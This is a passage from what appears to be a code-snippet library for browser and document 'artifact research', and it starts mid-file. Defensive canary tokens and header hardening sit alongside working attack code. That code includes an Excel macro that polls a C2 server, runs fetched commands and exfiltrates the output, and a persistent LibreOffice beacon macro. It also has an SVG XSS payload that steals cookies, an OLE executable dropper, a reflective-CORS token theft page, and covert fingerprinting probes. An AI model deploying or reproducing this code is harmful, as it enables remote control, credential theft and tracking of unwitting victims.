  ' Trigger on next LibreOffice launch via document event binding
  BindEvent("OnStartApp", "Standard.Module1.Run")
End Sub

Sub BindEvent(evt As String, macro As String)
  Dim oCfg As Object
  oCfg = CreateUnoService("com.sun.star.configuration.ConfigurationProvider")
  ' ...omitted: write to /org.openoffice.Office.Common/Events
End Sub`,"xba-beacon":`' beacon.bas — phone-home routine for persistent macro
Sub Beacon()
  Dim sHost As String
  sHost = "https://collect.example.com/beacon"
  Dim sPayload As String
  sPayload = "?host=" & Environ("HOSTNAME") & "&user=" & Environ("USER")

  ' Use Shell to invoke curl
  Shell("curl -s " & sHost & sPayload & " > /dev/null 2>&1")
End Sub

' Poll every 60 minutes
Sub RunLoop()
  Do While True
    Beacon
    Wait 60 * 60 * 1000  ' ms
  Loop
End Sub`,"svg-pay":`<?xml version="1.0" standalone="no"?>
<!-- SVG polyglot: valid SVG (renders) AND valid HTML target (XSS) -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" height="100" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="#c87820"/>
  <text x="50" y="55" text-anchor="middle" font-size="14">SIGIL</text>

  <!-- XSS payload — runs when opened in a browser context -->
  <script type="text/javascript">
    //<![CDATA[
      fetch('https://collect.example.com/x', {
        method: 'POST',
        body: JSON.stringify({
          cookie: document.cookie,
          path: location.pathname,
          origin: location.origin
        })
      });
    //]]>
  <\/script>
</svg>`,"svg-xss":`// xss.js — paired JS for the SVG polyglot
// When SVG is embedded via <img>, scripts are blocked.
// When embedded via <object> or <iframe>, scripts run.
// Force the latter via injection:
const payload = \`<object data="payload.svg" type="image/svg+xml"></object>\`;
document.body.insertAdjacentHTML('beforeend', payload);`,"ole-drop":`# dropper.py — OLE10Native embedded PE dropper
# REF: Trojan_Horse / ole_dropper.py
import struct, olefile

def build(docx_path: str, pe_path: str) -> bytes:
    """Embed PE as OLE10Native object inside a docx."""
    # Read the PE
    with open(pe_path, 'rb') as f: pe = f.read()

    # OLE10Native header
    obj_name = b'drop.exe\\x00'
    obj_data = struct.pack('<I', len(pe)) + pe
    native = struct.pack('<I', 0) + obj_name + obj_data  # simplified

    # Append to docx word/document.xml.rels → embed in document.xml
    # (full implementation omitted)
    return native`,"ole-man":`<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId100"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="embeddings/oleObject1.bin"/>
</Relationships>`,"xlsm-bas":`' C2Poll.bas — spreadsheet C2 polling
' REF: Extension Ideas — Excel macro C2

Sub Auto_Open()
  ' Schedule ourselves to run every 5 minutes
  Application.OnTime Now + TimeValue("00:05:00"), "PollC2"
End Sub

Sub PollC2()
  Dim cmd As String
  ' Use WEBSERVICE() to fetch from C2 endpoint
  cmd = Application.WorksheetFunction.WebService(
        "https://c2.example.com/cmd?host=" & Environ("COMPUTERNAME"))

  If Len(cmd) > 0 Then
    ' Shell out the fetched command
    Dim result As String
    result = Shell("cmd /c " & cmd, vbHide)

    ' Exfil the result back via WEBSERVICE
    Application.WorksheetFunction.WebService(
      "https://c2.example.com/out?r=" & result)
  End If

  Application.OnTime Now + TimeValue("00:05:00"), "PollC2"
End Sub`,"hsvg-html":`<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>decoy</title></head>
<body>
  <!-- SVG-as-image: no script execution (img-src CSP) -->
  <img src="payload.svg" alt="logo">
  <!-- But if attacker can serve via <object>... -->
</body></html>`,"hsvg-svg":`<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <!-- SVG that does XSS when loaded via <object>/<iframe> -->
  <script>
    new Image().src = 'https://collect.example.com/p?c=' + document.cookie;
  <\/script>
</svg>`,"srcset-html":`<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>viewport probe</title></head>
<body>
  <!-- srcset reveals DPR + viewport width to the server -->
  <img src="probe.png?dpr=1"
       srcset="probe.png?dpr=1 1x,
               probe.png?dpr=2 2x,
               probe.png?dpr=3 3x"
       sizes="(max-width: 600px) 100vw, 50vw">
</body></html>`,"srcset-an":`# analyze.py — reconstruct viewport from probe hits
from collections import defaultdict

def analyze(hits: list[dict]) -> dict:
  by_ip = defaultdict(list)
  for h in hits:
    by_ip[h['ip']].append(h)

  results = {}
  for ip, hits in by_ip.items():
    # Look at which dpr=N URL was hit
    dprs = sorted(set(int(h['url'].split('dpr=')[1]) for h in hits))
    results[ip] = {
      'dpr': max(dprs),  # browser picked the highest matching
      'hit_count': len(hits),
    }
  return results`,"pf-html":`<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body>
  <!-- Speculative prefetch reveals visited URLs to the server.
       Each prefetch fires a request the server can log. -->
  <link rel="prefetch" href="/probe/site-1.html">
  <link rel="prefetch" href="/probe/site-2.html">
  <link rel="prefetch" href="/probe/site-3.html">
  <!-- Browser prefetches these in idle time; server logs each hit -->
</body></html>`,"pf-srv":`// server.js — log prefetch hits and reconstruct visited set
const http = require('http');
const visited = new Map();  // ip → Set of prefetched URLs

http.createServer((req, res) => {
  if (req.url.startsWith('/probe/')) {
    const ip = req.socket.remoteAddress;
    if (!visited.has(ip)) visited.set(ip, new Set());
    visited.get(ip).add(req.url);
    console.log('[pf]', ip, req.url);
  }
  res.writeHead(204); res.end();
}).listen(3032);`,"uc-gen":`// generate.ts — URL canary generator
// REF: Canary Token Command Center
import { randomBytes, createHmac } from 'crypto';

export function generate(prefix = 'can') {
  const id    = randomBytes(6).toString('hex');
  const token = \`\${prefix}-\${id}\`;
  const url   = \`https://relay.example.com/r/\${token}\`;
  return { token, url, created: Date.now() };
}`,"uc-srv":`// server.ts — redirect + log
import express from 'express';
const app = express();

const HITS: Record<string, any[]> = {};

app.get('/r/:token', (req, res) => {
  const token = req.params.token;
  (HITS[token] ||= []).push({
    ts: Date.now(), ip: req.ip, ua: req.get('user-agent'),
    ref: req.get('referer'), accept: req.get('accept-language'),
  });
  res.redirect(302, 'https://target.example.com/');
});

app.get('/api/hits/:token', (req, res) => {
  res.json(HITS[req.params.token] || []);
});

app.listen(3033);`,"uc-ui":`// TokenList.tsx — canary token dashboard
import { useState, useEffect } from 'react';

export function TokenList() {
  const [tokens, setTokens] = useState([]);
  useEffect(() => {
    fetch('/api/tokens').then(r => r.json()).then(setTokens);
  }, []);
  return (
    <div className="grid gap-2">
      {tokens.map(t => (
        <div key={t.token} className="border p-2">
          <div className="font-mono">{t.token}</div>
          <div className="text-xs opacity-60">{t.url}</div>
          <div className="text-xs">hits: {t.hits?.length || 0}</div>
        </div>
      ))}
    </div>
  );
}`,"dc-srv":`# dns_server.py — DNS canary listener
# REF: Canary Token Command Center
import socketserver, struct

class H(socketserver.BaseRequestHandler):
  def handle(self):
    data = self.request[0]
    # Parse DNS question — extract subdomain
    # QNAME is at offset 12, labels separated by length byte
    qname = []
    i = 12
    while data[i] != 0:
      l = data[i]; qname.append(data[i+1:i+1+l].decode()); i += 1 + l
    name = '.'.join(qname)

    print(f'[dns] {self.client_address[0]} asked for {name}')

    # Log the hit — the subdomain is the canary token
    # ... emit alert

    # Reply with NXDOMAIN or A record
    reply = data[:2] + b'\\x81\\x83' + data[4:6] + b'\\x00\\x00\\x00\\x00'
    self.request[1].sendto(reply, self.client_address)

socketserver.UDPServer(('0.0.0.0', 53), H).serve_forever()`,"dc-gen":`# generate.py — generate DNS canary subdomain
import secrets, string

def generate(domain: str = 'canary.example.com') -> str:
  tok = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
  return f'{tok}.{domain}'`,"pc-inject":`# inject.py — PDF canary: embed /URI action that fires on open
# REF: Canary Token Command Center
def inject(pdf: bytes, canary_url: str) -> bytes:
    # Add an OpenAction → URI entry
    action = (
        b'999 0 obj\\n<< /Type /Action /S /URI /URI (' + canary_url.encode() + b') >>\\nendobj\\n'
    )
    # Update Catalog to reference this action as /OpenAction
    # (omitted: actual catalog walk)
    return action + pdf`,"pc-serve":`# serve.py — HTTP server that returns canary-laced PDFs
from http.server import BaseHTTPRequestHandler, HTTPServer
from inject import inject

BASE_PDF = b'%PDF-1.7 ...'  # template PDF

class H(BaseHTTPRequestHandler):
  def do_GET(self):
    token = self.path.strip('/')
    pdf = inject(BASE_PDF, f'https://relay.example.com/h/{token}')
    self.send_response(200)
    self.send_header('Content-Type', 'application/pdf')
    self.end_headers()
    self.wfile.write(pdf)

HTTPServer(('', 3034), H).serve_forever()`,"ec-comp":`# compose.py — build a canary HTML email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def compose(to: str, pixel_url: str) -> bytes:
  msg = MIMEMultipart('related')
  msg['To'] = to
  msg['Subject'] = 'Q3 strategy deck'

  html = f'''<html><body>
    <p>Hi — wanted to share the Q3 deck. Let me know if you have questions.</p>
    <img src="{pixel_url}" width="1" height="1" alt="">
  </body></html>'''
  msg.attach(MIMEText(html, 'html'))
  return msg.as_bytes()`,"ec-px":`# pixel.py — generate per-recipient tracking pixel
import hashlib, time

def make_url(recipient: str, secret: str) -> str:
  tok = hashlib.hmac_sha256(
    secret.encode(), f'{recipient}:{time.time()}'.encode()
  ).hexdigest()[:16]
  return f'https://relay.example.com/px/{tok}.gif'`,"ak-gen":`# gen_keys.py — generate fake AWS keys with CloudTrail watchers
# REF: Canary Token Command Center
import secrets, string

def generate() -> dict:
  # Real-looking but fake AWS keys
  ak = 'AKIA' + ''.join(secrets.choice(string.ascii_uppercase + '234567') for _ in range(17))
  sk = secrets.token_urlsafe(40)
  return { 'access_key': ak, 'secret_key': sk, 'note': 'CANARY — do not use' }`,"ak-watch":`# trail_watcher.py — poll CloudTrail for usage of fake keys
import boto3, json

def watch(access_key: str):
  ct = boto3.client('cloudtrail')
  events = ct.lookup_events(
    LookupAttributes=[{'AttributeKey':'AccessKeyId','AttributeValue':access_key}]
  )
  for ev in events['Events']:
    print(f'[hit] {ev["EventTime"]} {ev["EventName"]} from {ev.get("CloudTrailEvent","")}')
    # Alert via webhook
    # ...`,"sq-seed":`-- seed.sql — plant a fake row containing a unique token per recipient
-- REF: Canary Token Command Center

CREATE TABLE IF NOT EXISTS canary_users (
  id           BIGINT PRIMARY KEY,
  email        TEXT,
  api_token    TEXT,
  is_canary    BOOLEAN DEFAULT false,
  created_at   TIMESTAMP DEFAULT now()
);

-- Per-customer canary row
INSERT INTO canary_users (id, email, api_token, is_canary)
VALUES (999999, 'noreply+can-a7f3d2@example.com', 'sk_live_a7f3d2_FAKE', true)
ON CONFLICT (id) DO NOTHING;`,"sq-watch":`# watcher.py — poll DB logs for queries touching the canary row
# Detects: SELECT * FROM users WHERE id = 999999 → exfil attempt
import psycopg2

def watch(conn_str: str):
  conn = psycopg2.connect(conn_str)
  conn.autocommit = True
  cur = conn.cursor()
  cur.execute('CREATE TABLE IF NOT EXISTS audit_log (id serial, ts timestamptz default now(), event text)')
  # Attach a trigger on every relevant table
  # ... omitted for brevity`,"rc-hook":`#!/bin/bash
# hook.sh — post-clone git hook canary
# When this repo is cloned, the local git config + this hook
# will fire a beacon back to the canary server.

URL="https://relay.example.com/clone/$(hostname)/$(whoami)"
curl -s "$URL" > /dev/null 2>&1
`,"rc-setup":`#!/bin/bash
# setup.sh — install the canary hook into a target repo
set -e
REPO=$1
TOKEN=$2

mkdir -p "$REPO/.git/hooks"
cp hook.sh "$REPO/.git/hooks/post-checkout"
chmod +x "$REPO/.git/hooks/post-checkout"

# Add a remote that includes the canary token
git -C "$REPO" remote add canary "https://relay.example.com/$TOKEN"
`,"dcx-inj":`# inject.py — DOCX canary using INCLUDEPICTURE field
# REF: Canary Token Command Center
import zipfile, io

def inject(docx: bytes, canary_url: str) -> bytes:
  z = zipfile.ZipFile(io.BytesIO(docx), 'r')
  out = io.BytesIO()
  with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as w:
    for info in z.infolist():
      data = z.read(info.filename)
      if info.filename == 'word/document.xml':
        # Inject INCLUDEPICTURE field at end of body
        field = (
          f'<w:fldSimple w:instr="INCLUDEPICTURE '
          f'&quot;{canary_url}&quot;"/>'
        ).encode()
        data = data.replace(b'</w:body>',
                            field + b'</w:body>')
      w.writestr(info, data)
  return out.getvalue()`,"hdr-nginx":`# nginx.conf — hardened header policy
server {
  listen 443 ssl http2;
  server_name .target.example.com;

  # Strip ETag at the edge — breaks ghost cookies
  proxy_hide_header ETag;
  proxy_set_header  If-None-Match "";

  # Strict CSP — no unsafe-inline, no data: in script-src
  add_header Content-Security-Policy
    "default-src 'self'; script-src 'self' 'nonce-\${nonce}'; "
    "object-src 'none'; base-uri 'none'; "
    "frame-ancestors 'none'" always;

  add_header Strict-Transport-Security
    "max-age=63072000; includeSubDomains; preload" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "no-referrer" always;
  add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
}`,"hdr-csp":`// csp.js — CSP header builder + analyzer
// Parses and annotates Content-Security-Policy headers

const DIRECTIVES = {
  'default-src': { risk: 0, desc: 'fallback policy for all resource types' },
  'script-src':  { risk: 2, desc: 'JS sources — unsafe-inline/eval = critical' },
  'style-src':   { risk: 1, desc: 'CSS sources — unsafe-inline allows injection' },
  'img-src':     { risk: 0, desc: 'image sources — data: allows exfil' },
  'connect-src': { risk: 1, desc: 'fetch/XHR targets — wildcard = tracking' },
  'frame-src':   { risk: 1, desc: 'iframe sources' },
  'font-src':    { risk: 0, desc: 'web font sources' },
  'media-src':   { risk: 0, desc: 'audio/video sources' },
  'object-src':  { risk: 2, desc: 'plugin content — always deny' },
  'base-uri':    { risk: 2, desc: 'base href injection vector if not set' },
  'form-action': { risk: 2, desc: 'form submission target — critical' },
  'report-uri':  { risk: 1, desc: 'violation beacon endpoint' },
};

export function parseCSP(header) {
  return header.split(';').map(d => d.trim()).filter(Boolean).map(d => {
    const [name, ...vals] = d.split(/\\s+/);
    const meta = DIRECTIVES[name] || { risk: 0, desc: 'unknown directive' };
    const unsafe = vals.filter(v =>
      ["'unsafe-inline'","'unsafe-eval'","data:","*"].includes(v)
    );
    return {
      name, values: vals, ...meta,
      risk: unsafe.length ? Math.max(meta.risk, 2) : meta.risk,
      unsafe,
    };
  });
}

// claude.ai CSP (captured 2026-09-11 00:50:47)
export const EXAMPLE = \`script-src 'nonce-iHD7wSxUpzSvjsO+roEc2w==' \\
'strict-dynamic' \\
'sha256-dL+AuZieX6cC/M+MhQHnBoUSfG4Q3CWXteMuZkUJ+p8=' \\
'https:' 'unsafe-inline'; \\
object-src 'none'; \\
base-uri 'none';\`;`,"hdr-an":`# analyze.py — HTTP header risk analyzer
RISKY = {
  'set-cookie': 2,  # persistent identifiers
  'etag': 2,        # ghost cookie
  'x-frame-options': 0,
  'content-security-policy': 0,
  'strict-transport-security': 0,
  'x-content-type-options': 0,
  'access-control-allow-origin': 1,
  'content-type': 0,
  'referrer-policy': 0,
  'permissions-policy': 0,
}

def analyze(headers: dict) -> list[dict]:
  return [
    {
      'k': k, 'v': v[:128],
      'risk': RISKY.get(k.lower(), 0),
      'note': 'risky' if RISKY.get(k.lower(), 0) >= 2 else ''
    }
    for k, v in headers.items()
  ]`,"rob-txt":`# robots.txt — crawler honeypot
# REF: FFF / robots-trap

User-agent: *
Disallow: /admin/
Disallow: /private/
Disallow: /_canary/abc123-secret-data
Disallow: /_canary/def456-leaked-keys

# Real sitemap (legit crawlers)
Sitemap: https://example.com/sitemap.xml`,"rob-trap":`// trap.js — detect crawlers that hit Disallow paths
// Legit crawlers (Google, Bing) respect robots.txt; bad actors ignore it.
import express from 'express';
const app = express();

const TRAP_PATHS = ['/_canary/abc123', '/_canary/def456'];
const hits = [];

app.use((req, _res, next) => {
  if (TRAP_PATHS.some(p => req.path.startsWith(p))) {
    hits.push({
      ts: Date.now(), ip: req.ip, ua: req.get('user-agent'),
      path: req.path,
    });
    console.warn('[trap]', req.ip, req.path);
  }
  next();
});`,"mf-json":`{
  "name": "Manufactory Demo PWA",
  "short_name": "MF",
  "description": "Browser artifact research",
  "start_url": "/",
  "scope": "/",
  "display": "standalone",
  "background_color": "#0e0c09",
  "theme_color": "#c87820",
  "icons": [
    { "src": "/favicon.ico", "sizes": "16x16 32x32 48x48", "type": "image/x-icon" },
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png" }
  ],
  "permissions": ["storage", "notifications"],
  "shortcuts": [
    { "name": "Generate", "url": "/generate" },
    { "name": "Analyze",  "url": "/analyze"  }
  ]
}`,"mf-sw":`// sw.js — paired service worker for the PWA manifest
const CACHE = 'mf-pwa-v1';
const ASSETS = ['/', '/index.html', '/favicon.ico', '/manifest.json'];

self.addEventListener('install', e => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
});
self.addEventListener('activate', e => {
  e.waitUntil(self.clients.claim());
});
self.addEventListener('fetch', e => {
  e.respondWith(caches.match(e.request).then(r => r || fetch(e.request)));
});`,"wk-sec":`# security.txt — RFC 9116 well-known file
# Place at /.well-known/security.txt

Contact: mailto:security@example.com
Expires: 2026-12-31T23:59:59Z
Preferred-Languages: en, ja
Canonical: https://example.com/.well-known/security.txt
Policy: https://example.com/disclosure
Encryption: https://example.com/pgp.asc`,"wk-pki":`# pki-validation file
# Place at /.well-known/pki-validation/<token>.txt
# Body must match the value your CA gave you.
ca3-0a7f-c8b2-4e1f-9d4e-7e1a8f9b2c1d`,"jwt-enc":`// encode.ts — JWT with covert claims
// The payload is signed (HMAC) but the claims themselves can carry hidden data
import { createHmac } from 'crypto';

function b64url(s: string | Uint8Array): string {
  return Buffer.from(s).toString('base64url');
}

export function encode(payload: any, secret: string): string {
  const header = b64url(JSON.stringify({ alg:'HS256', typ:'JWT' }));
  const body   = b64url(JSON.stringify({
    ...payload,
    // Hidden channel — claim namespaced under x-covert
    'x-covert': b64url('hidden payload here'),
  }));
  const sig = createHmac('sha256', secret).update(\`\${header}.\${body}\`).digest('base64url');
  return \`\${header}.\${body}.\${sig}\`;
}`,"jwt-dec":`// decode.ts — read JWT payload (including covert claims)
export function decode(jwt: string): any {
  const [h, b, s] = jwt.split('.');
  const payload = JSON.parse(Buffer.from(b, 'base64url').toString());
  // Look for x-covert channels
  const covert = payload['x-covert'];
  if (covert) {
    payload._decoded = Buffer.from(covert, 'base64url').toString();
  }
  return payload;
}`,"csp-pol":"// policy.js — generate CSP-Report-Only policy\n// Allow sites to ship CSP without breaking anything while collecting violations\nexport function build(reportUri: string, directives: Record<string,string>) {\n  const parts = Object.entries(directives)\n    .map(([k, v]) => `${k} ${v}`);\n  parts.push(`report-uri ${reportUri}`);\n  return parts.join('; ');\n}","csp-coll":`# collector.py — receive CSP violation reports
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

VIOLATIONS = []

class H(BaseHTTPRequestHandler):
  def do_POST(self):
    ln = int(self.headers.get('Content-Length','0'))
    body = self.rfile.read(ln).decode()
    try: rep = json.loads(body)
    except: rep = { 'raw': body }
    VIOLATIONS.append(rep)
    self.send_response(204); self.end_headers()
  def do_GET(self):
    self.send_response(200)
    self.send_header('Content-Type', 'application/json'); self.end_headers()
    self.wfile.write(json.dumps(VIOLATIONS[-100:]).encode())

HTTPServer(('', 3035), H).serve_forever()`,"ct-html":`<!DOCTYPE html>
<!-- MIME sniffing probe — server sends text/plain, browser may execute as HTML -->
<html><body>
  <script>alert('sniff succeeded — X-Content-Type-Options missing');<\/script>
</body></html>`,"ct-an":`# analyze.py — detect MIME-sniffing browsers
# If a hit arrives at /ct-alert, the browser sniffed text/plain as HTML.
def analyze(hits: list[dict]) -> dict:
  by_ua = {}
  for h in hits:
    by_ua.setdefault(h['ua'], []).append(h)
  return { ua: len(hits) for ua, hits in by_ua.items() }`,"cors-srv":`// server.js — abusive CORS server (credentials + wildcard)
// Real browsers refuse Access-Control-Allow-Origin: * + credentials: include.
// Instead, reflect the Origin header back, which IS allowed with creds.
import express from 'express';
const app = express();

app.use((req, res, next) => {
  const origin = req.get('Origin');
  if (origin) {
    res.set('Access-Control-Allow-Origin', origin);  // reflection!
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  }
  next();
});

app.get('/sensitive', (req, res) => {
  // req.cookies has the victim's cookies attached
  res.json({ token: req.cookies.session });
});
app.listen(3036);`,"cors-html":`<!DOCTYPE html>
<html><body>
<script>
  // From attacker.com — read victim's data from target.com
  fetch('https://target.example.com/sensitive', {
    credentials: 'include'
  }).then(r => r.json()).then(d => {
    // Exfil
    new Image().src = 'https://collect.example.com/?' + JSON.stringify(d);
  });
<\/script>
</body></html>`,"cv-probe":`// canvas_probe.js — 2D rendering fingerprint
// BSCA Type: P (passive) | Phase: 0 | Persist: HIGH

export async function canvasFingerprint() {
  const c   = document.createElement('canvas');
  c.width   = 280;
  c.height  = 60;
  const ctx = c.getContext('2d');

  // Text rendering — font hinting differs per OS/GPU
  ctx.fillStyle   = '#f60';
  ctx.fillRect(125, 1, 62, 20);
  ctx.fillStyle   = '#069';
  ctx.font        = '11pt "Arial"';
  ctx.fillText('Cwm fjordbank glyphs vext quiz, \\u2764', 2, 15);

  // Shape + gradient
  ctx.fillStyle   = 'rgba(102,204,0,0.7)';
  ctx.beginPath();
  ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
  ctx.closePath();
  ctx.fill();

  // Shadow rendering
  ctx.shadowOffsetX = 2;
  ctx.shadowColor   = 'blue';
  ctx.fillStyle     = 'rgba(255,0,255,0.5)';
  ctx.fillRect(0, 30, 6, 6);
  ctx.fillRect(2, 0, 4, 4);

  const raw  = c.toDataURL();
  const hash = await digest(raw);
  return { raw: raw.slice(0, 32) + '…', hash, w: c.width, h: c.height };
}

async function digest(str) {
  const buf  = await crypto.subtle.digest(
    'SHA-256', new TextEncoder().encode(str)
  );
  return Array.from(new Uint8Array(buf))
    .map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 16);
}`,"cv-hash":`// hash.js — short stable hash from a canvas data URL
export async function sha256short(s) {
  const buf = await crypto.subtle.digest('SHA-256',
    new TextEncoder().encode(s));
  return Array.from(new Uint8Array(buf))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('')
    .slice(0, 16);
}`,"cv-coll":`// collect.js — collect canvas + ship to backend
import { canvasFingerprint } from './probe.js';

const fp = await canvasFingerprint();
navigator.sendBeacon('/fp/collect', JSON.stringify({
  type: 'canvas', hash: fp.hash, ts: Date.now(),
}));`,"wg-probe":`// webgl_probe.js — WebGL GPU fingerprint
export function webglFingerprint() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (!gl) return { supported: false };

  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    supported: true,
    vendor:   gl.getParameter(gl.VENDOR),
    renderer: gl.getParameter(gl.RENDERER),
    unmaskedVendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : null,
    unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL): null,
    version:  gl.getParameter(gl.VERSION),
    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
    extensions: gl.getSupportedExtensions(),
  };
}`,"wg-ext":`// extensions.js — probe WebGL extension support
export function extensions() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl');
  if (!gl) return [];
  return gl.getSupportedExtensions() || [];
}`,"au-probe":`// audio_probe.js — OfflineAudioContext fingerprint
// BSCA Type: P | Phase: 1 (async) | Persist: HIGH
// Mechanism: oscillator output varies by OS audio stack + CPU

export async function audioFingerprint() {
  const ctx = new OfflineAudioContext(1, 44100, 44100);

  const osc = ctx.createOscillator();
  osc.type  = 'triangle';
  osc.frequency.setValueAtTime(10000, ctx.currentTime);

  const comp = ctx.createDynamicsCompressor();
  comp.threshold.setValueAtTime(-50,  ctx.currentTime);
  comp.knee.setValueAtTime(40,        ctx.currentTime);
  comp.ratio.setValueAtTime(12,       ctx.currentTime);
  comp.attack.setValueAtTime(0,       ctx.currentTime);
  comp.release.setValueAtTime(0.25,    ctx.currentTime);

  osc.connect(comp);
  comp.connect(ctx.destination);
  osc.start(0);

  const rendered = await ctx.startRendering();
  const data     = rendered.getChannelData(0);

  // Sum a slice of the Float32 output — the sum is implementation-specific
  let sum = 0;
  for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);

  return {
    sum:   sum.toFixed(10),
    hash:  hashFloat(sum),
    sr:    rendered.sampleRate,
    len:   rendered.length,
  };
}

function hashFloat(f) {
  const s = f.toFixed(15);
  let h = 0;
  for (let i = 0; i < s.length; i++) h = (Math.imul(31, h) + s.charCodeAt(i)) | 0;
  return (h >>> 0).toString(16);
}`,"au-worker":`// worker.js — off-main-thread audio rendering
self.onmessage = async () => {
  const ctx = new OfflineAudioContext(1, 44100, 44100);
  const osc = ctx.createOscillator();
  osc.type = 'triangle';
  osc.frequency.value = 10000;
  osc.connect(ctx.destination);
  osc.start(0);
  const rendered = await ctx.startRendering();
  const data = rendered.getChannelData(0);
  let sum = 0;
  for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
  self.postMessage({ sum: sum.toFixed(10) });
};`,"ft-probe":`// font_probe.js — measure font availability via offsetWidth
const TEST = 'mmmmmmmmmmlli';
const FONTS = ['Arial','Helvetica','Times','Courier','Comic Sans MS','Impact',
               'Verdana','Georgia','Palatino','Garamond','Bookman','Tahoma',
               'Trebuchet MS','Monaco','Consolas','Menlo','SF Pro','Segoe UI'];

export function probeFonts() {
  const base = document.createElement('span');
  base.style.cssText = 'font-size:72px;visibility:hidden;position:absolute;';
  base.textContent = TEST;
  document.body.appendChild(base);

  // Reference size in monospace
  base.style.fontFamily = 'monospace';
  const refW = base.offsetWidth;
  base.style.fontFamily = 'serif';
  const refS = base.offsetWidth;

  const results: Record<string, boolean> = {};
  for (const f of FONTS) {
    base.style.fontFamily = f + ', monospace';
    // If width changes from monospace reference, the font is installed
    results[f] = base.offsetWidth !== refW;
  }
  base.remove();
  return results;
}`,"ft-base":`// baseline.js — baseline font metrics
const BASES = ['monospace','serif','sans-serif','cursive','fantasy'];
export function baseline() {
  const el = document.createElement('span');
  el.style.cssText = 'font-size:72px;visibility:hidden;';
  el.textContent = 'mmmmmmmmmmlli';
  document.body.appendChild(el);
  const out: Record<string, number> = {};
  for (const b of BASES) {
    el.style.fontFamily = b;
    out[b] = el.offsetWidth;
  }
  el.remove();
  return out;
}`,"nv-probe":`// nav_probe.js — collect navigator.* properties
export function probe() {
  return {
    userAgent: navigator.userAgent,
    platform:   navigator.platform,
    language:   navigator.language,
    languages:  navigator.languages,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: (navigator as any).deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    appVersion: navigator.appVersion,
    oscpu: (navigator as any).oscpu,
    buildID: (navigator as any).buildID,
    doNotTrack: navigator.doNotTrack,
    cookieEnabled: navigator.cookieEnabled,
    webdriver: navigator.webdriver,
    pdfViewer: (navigator as any).pdfViewerEnabled,
  };
}`,"nv-parse":`// parse.js — derive bits from navigator probe
export function bits(n: any) {
  let h = 0;
  h ^= strHash(n.userAgent);
  h ^= strHash(n.platform);
  h ^= strHash(n.language);
  h ^= (n.hardwareConcurrency || 0) * 17;
  h ^= (n.deviceMemory || 0) * 23;
  h ^= (n.maxTouchPoints || 0) * 7;
  return { hash: (h >>> 0).toString(16), bits: popcount(h) };
}
function strHash(s) { let h=0; for (const c of s||'') h=Math.imul(31,h)+c.charCodeAt(0)|0; return h; }
function popcount(n) { let c=0; while(n){c+=n&1;n>>>=1;} return c; }`,"bt-probe":`// probe.js — Battery API fingerprint
// Some browsers return identical battery state per session
export async function probe() {
  if (!navigator.getBattery) return { supported: false };
  const b = await navigator.getBattery();
  return {
    supported: true,
    level: b.level,
    charging: b.charging,
    chargingTime: b.chargingTime,
    dischargingTime: b.dischargingTime,
  };
}`,"sn-probe":`// probe.js — Sensor API (accelerometer/gyroscope)
// Requires Permissions API in modern browsers
export async function probe() {
  if (!('Accelerometer' in window)) return { supported: false };
  try {
    const sensor = new Accelerometer({ frequency: 60 });
    const samples: number[] = [];
    sensor.addEventListener('reading', () => {
      samples.push(sensor.x || 0, sensor.y || 0, sensor.z || 0);
      if (samples.length > 600) sensor.stop();
    });
    sensor.start();
    await new Promise(r => setTimeout(r, 5000));
    sensor.stop();
    // Hash the sample distribution — varies by device
    return {
      supported: true,
      sampleCount: samples.length,
      sum: samples.reduce((a,b)=>a+b, 0).toFixed(6),
      hash: hashSamples(samples),
    };
  } catch (e) { return { supported:false, err: String(e) }; }
}
function hashSamples(s: number[]) {
  let h = 0;
  for (const v of s) h = Math.imul(31, h) + Math.round(v * 1e6) | 0;
  return (h >>> 0).toString(16);
}`,"sn-an":`// analyze.js — cluster sensor samples to derive stable bits
import { probe } from './probe.js';

const RUNS = 5;
export async function stable() {
  const runs = await Promise.all(Array.from({length:RUNS}, probe));
  // Take runs that agree in first 8 chars of hash
  const hashes = runs.map(r => r.hash || '').slice(0, 8);
  return { hashes, stable: new Set(hashes).size === 1 };
}`,"pt-probe":`// probe.js — pointer trajectory fingerprint
// Tracks mouse movements for 5 seconds; derives entropy from path
let pts: number[] = [];
let running = false;

export function start() {
  running = true;
  window.addEventListener('pointermove', onMove);
  return new Promise(resolve => setTimeout(() => {
    running = false;
    window.removeEventListener('pointermove', onMove);
    resolve(analyze(pts));
  }, 5000));
}

